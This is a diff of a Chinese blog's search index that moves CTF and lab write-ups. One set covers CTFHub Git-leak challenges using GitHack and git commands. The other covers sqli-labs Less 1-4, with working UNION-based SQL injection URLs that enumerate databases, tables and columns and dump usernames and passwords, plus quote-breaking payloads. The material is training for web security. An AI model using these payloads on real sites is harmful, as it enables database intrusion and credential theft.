+<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081833.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081834.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>Web基础</category>
+      </categories>
+      <tags>
+        <tag>信息泄露</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Web基础之信息泄露（上）</title>
     <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
     <content><![CDATA[<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081801.png" alt="image"></p>
@@ -564,105 +615,6 @@
       </categories>
       <tags>
         <tag>信息泄露</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Web基础之信息泄露（下）</title>
-    <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
-<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png" alt="image"></p>
-<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
-<p>切换版本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure>
-<p>对比两次提交</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure>
-<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol>
-<li><p>扫描发现 .git 泄露</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081825.png" alt="image"></p>
-</li>
-<li><p>使用 GitHack 工具 clone 目标源代码到本地</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081826.png" alt="image"></p>
-</li>
-<li><p>执行 git log 查看历史记录</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081827.png" alt="image"></p>
-</li>
-<li><p>执行 git show 查看提交详情</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081828.png" alt="image"></p>
-<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p>
-</li>
-</ol>
-<p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
-<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol>
-<li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p>
-</li>
-<li><p>利用GitHack 工具将网站源代码 clone 到本地</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081829.png" alt="image"></p>
-</li>
-<li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081830.png" alt="image"></p>
-</li>
-<li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081831.png" alt="image"></p>
-</li>
-</ol>
-<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081832.png" alt="image"></p>
-<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081833.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081834.png" alt="image"></p>
-]]></content>
-      <categories>
-        <category>Web基础</category>
-      </categories>
-      <tags>
-        <tag>信息泄露</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs靶场Less-1-4</title>
-    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/</url>
-    <content><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092304.png" alt="image"></p>
-<h3 id="使用order-by得到有多少字段数"><a href="#使用order-by得到有多少字段数" class="headerlink" title="使用order by得到有多少字段数"></a>使用order by得到有多少字段数</h3><p>依次请求order by 1,2,3,4直到报错。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;1%27order%20by%204--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092305.png" alt="image"></p>
-<p>证明有三个字段</p>
-<h3 id="使用union联合注入，得到能回显的字段"><a href="#使用union联合注入，得到能回显的字段" class="headerlink" title="使用union联合注入，得到能回显的字段"></a>使用union联合注入，得到能回显的字段</h3><p>请求 ?id=-1 union select 1,2,3–+</p>
-<p>id=-1为假，所以页面会执行union select 1,2,3。然后返回能回显的字段</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092306.png" alt="image"></p>
-<p>得到能回显的字段是2和3</p>
-<h3 id="查数据库中的数据"><a href="#查数据库中的数据" class="headerlink" title="查数据库中的数据"></a>查数据库中的数据</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092301.png" alt="image"></p>
-<h4 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092302.png" alt="image"></p>
-<h4 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092303.png" alt="image"></p>
-<h4 id="爆-users表中username和password的值"><a href="#爆-users表中username和password的值" class="headerlink" title="爆 users表中username和password的值"></a>爆 users表中username和password的值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,username,password%20from%20users%20where%20id&#x3D;2--+</span><br></pre></td></tr></table></figure>
-<p>此时的SQL语句为</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,username,password from users where id&#x3D;2--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092307.png" alt="image"></p>
-<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>可以成功注入的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1</span><br><span class="line">or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-<p>其余的ppayload于less1中一致，只需要将less1中的’去掉即可</p>
-<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>可以成功注入的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">) or &#39;1&#39;&#x3D;(&#39;1&#39; </span><br><span class="line">) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-<p>其余的ppayload于less1中一致，只需要将less1中的’换成’)即可</p>
-<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>这里id参数使用了””和()包装</p>
-<p>可以成功注入的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“) or ”1”&#x3D;(“1</span><br><span class="line">“) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
-<p>其余的ppayload于less1中一致，只需要将less1中的’换成”)即可</p>
-]]></content>
-      <categories>
-        <category>sqli-labs靶场</category>
-      </categories>
-      <tags>
-        <tag>sqli-labs</tag>
       </tags>
   </entry>
   <entry>
@@ -731,6 +683,54 @@
 <p>上述三者有什么区别？①和②是一样的，表达的意思是 id=1 条件和 1=1 条件进行与运算</p>
 <p>③的意思是 id=1 条件与 1 进行&amp;位操作，id=1 被当作 true，与 1 进行 &amp; 运算 结果还是 1，再进行=操作，1=1,还是 1（ps：&amp;的优先级大于=）</p>
 <p>Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要<br>的时候可以利用该方法进行注入结果。例如将某一字符转换为 ascii 码后，可以分别与<br>1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是 ascii 码值。再从<br>ascii 值反推回字符。（运用较少）</p>
+]]></content>
+      <categories>
+        <category>sqli-labs靶场</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs靶场Less-1-4</title>
+    <url>/2020/09/23/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess-1-4/</url>
+    <content><![CDATA[<h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><h3 id="验证存在SQL注入"><a href="#验证存在SQL注入" class="headerlink" title="验证存在SQL注入"></a>验证存在SQL注入</h3><p><strong><a href="http://47.101.62.20:11567/Less-1/?id=1">http://47.101.62.20:11567/Less-1/?id=1</a></strong> 后面直接添加一个’，报错</p>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092304.png" alt="image"></p>
+<h3 id="使用order-by得到有多少字段数"><a href="#使用order-by得到有多少字段数" class="headerlink" title="使用order by得到有多少字段数"></a>使用order by得到有多少字段数</h3><p>依次请求order by 1,2,3,4直到报错。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;1%27order%20by%204--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092305.png" alt="image"></p>
+<p>证明有三个字段</p>
+<h3 id="使用union联合注入，得到能回显的字段"><a href="#使用union联合注入，得到能回显的字段" class="headerlink" title="使用union联合注入，得到能回显的字段"></a>使用union联合注入，得到能回显的字段</h3><p>请求 ?id=-1 union select 1,2,3–+</p>
+<p>id=-1为假，所以页面会执行union select 1,2,3。然后返回能回显的字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,2,3--+</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092306.png" alt="image"></p>
+<p>得到能回显的字段是2和3</p>
+<h3 id="查数据库中的数据"><a href="#查数据库中的数据" class="headerlink" title="查数据库中的数据"></a>查数据库中的数据</h3><h4 id="列出所有数据库"><a href="#列出所有数据库" class="headerlink" title="列出所有数据库"></a>列出所有数据库</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092301.png" alt="image"></p>
+<h4 id="爆-security-数据库的数据表"><a href="#爆-security-数据库的数据表" class="headerlink" title="爆 security 数据库的数据表"></a>爆 security 数据库的数据表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema&#x3D;%27security%27--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092302.png" alt="image"></p>
+<h4 id="爆-users-表的列"><a href="#爆-users-表的列" class="headerlink" title="爆 users 表的列"></a>爆 users 表的列</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’users’--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092303.png" alt="image"></p>
+<h4 id="爆-users表中username和password的值"><a href="#爆-users表中username和password的值" class="headerlink" title="爆 users表中username和password的值"></a>爆 users表中username和password的值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.101.62.20:11567&#x2F;Less-1&#x2F;?id&#x3D;-1%27union%20select%201,username,password%20from%20users%20where%20id&#x3D;2--+</span><br></pre></td></tr></table></figure>
+<p>此时的SQL语句为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id&#x3D;’-1’union select 1,username,password from users where id&#x3D;2--+ LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092307.png" alt="image"></p>
+<h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>可以成功注入的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1</span><br><span class="line">or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>其余的ppayload于less1中一致，只需要将less1中的’去掉即可</p>
+<h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>可以成功注入的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">) or &#39;1&#39;&#x3D;(&#39;1&#39; </span><br><span class="line">) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>其余的ppayload于less1中一致，只需要将less1中的’换成’)即可</p>
+<h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>这里id参数使用了””和()包装</p>
+<p>可以成功注入的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">“) or ”1”&#x3D;(“1</span><br><span class="line">“) or 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+<p>其余的ppayload于less1中一致，只需要将less1中的’换成”)即可</p>
 ]]></content>
       <categories>
         <category>sqli-labs靶场</category>
